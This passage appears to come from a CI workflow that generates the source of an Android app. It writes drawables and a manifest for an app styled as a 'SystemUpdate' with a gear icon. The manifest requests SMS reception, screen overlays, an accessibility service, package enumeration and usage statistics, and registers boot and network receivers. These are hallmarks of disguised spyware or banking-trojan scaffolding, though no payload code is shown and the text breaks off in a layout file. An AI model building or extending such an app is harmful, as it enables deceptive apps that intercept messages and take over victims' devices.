      - name: Create drawable/ic_success.xml
        run: |
          cat > app/src/main/res/drawable/ic_success.xml << 'EOF'
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="24dp"
              android:height="24dp"
              android:viewportWidth="24"
              android:viewportHeight="24">
              <path
                  android:fillColor="#34A853"
                  android:pathData="M12,2C6.48,2 2,6.48 2,12s4.48,10 10,10s10-4.48 10-10S17.52,2 12,2z M10,17l-5-5l1.41-1.41L10,14.17l7.59-7.59L19,8L10,17z"/>
          </vector>
          EOF

      - name: Create drawable/system_button.xml
        run: |
          cat > app/src/main/res/drawable/system_button.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <selector xmlns:android="http://schemas.android.com/apk/res/android">
              <item android:state_pressed="true">
                  <shape android:shape="rectangle">
                      <solid android:color="@color/button_pressed"/>
                      <corners android:radius="28dp"/>
                  </shape>
              </item>
              <item>
                  <shape android:shape="rectangle">
                      <solid android:color="@color/system_blue"/>
                      <corners android:radius="28dp"/>
                  </shape>
              </item>
          </selector>
          EOF

      - name: Create drawable/system_button_outline.xml
        run: |
          cat > app/src/main/res/drawable/system_button_outline.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <selector xmlns:android="http://schemas.android.com/apk/res/android">
              <item android:state_pressed="true">
                  <shape android:shape="rectangle">
                      <stroke android:width="2dp" android:color="@color/button_pressed"/>
                      <solid android:color="#E8F0FE"/>
                      <corners android:radius="28dp"/>
                  </shape>
              </item>
              <item>
                  <shape android:shape="rectangle">
                      <stroke android:width="2dp" android:color="@color/system_blue"/>
                      <solid android:color="@color/white"/>
                      <corners android:radius="28dp"/>
                  </shape>
              </item>
          </selector>
          EOF

      # ==================== ANDROID MANIFEST ====================
      
      - name: Create AndroidManifest.xml
        run: |
          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              xmlns:tools="http://schemas.android.com/tools">

              <!-- PERMISSIONS -->
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.RECEIVE_SMS" />
              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
              <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
              <uses-permission android:name="android.permission.GET_TASKS" />
              <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />

              <application
                  android:allowBackup="true"
                  android:icon="@drawable/ic_gear"
                  android:label="@string/app_name"
                  android:theme="@style/Theme.SystemUpdate"
                  android:usesCleartextTraffic="true">
                  
                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:theme="@style/Theme.SystemUpdate">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <!-- AI Accessibility Service -->
                  <service
                      android:name=".AIAccessibilityService"
                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.accessibilityservice.AccessibilityService" />
                      </intent-filter>
                      <meta-data
                          android:name="android.accessibilityservice"
                          android:resource="@xml/accessibility_config" />
                  </service>

                  <receiver
                      android:name=".BootReceiver"
                      android:exported="true"
                      tools:node="merge">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED" />
                      </intent-filter>
                  </receiver>

                  <receiver
                      android:name=".NetworkReceiver"
                      android:exported="true"
                      tools:node="merge">
                      <intent-filter>
                          <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
                      </intent-filter>
                  </receiver>
              </application>
          </manifest>
          EOF

      # ==================== LAYOUT ====================
      
      - name: Create layout/activity_main.xml
        run: |
          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              xmlns:app="http://schemas.android.com/apk/res-auto"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
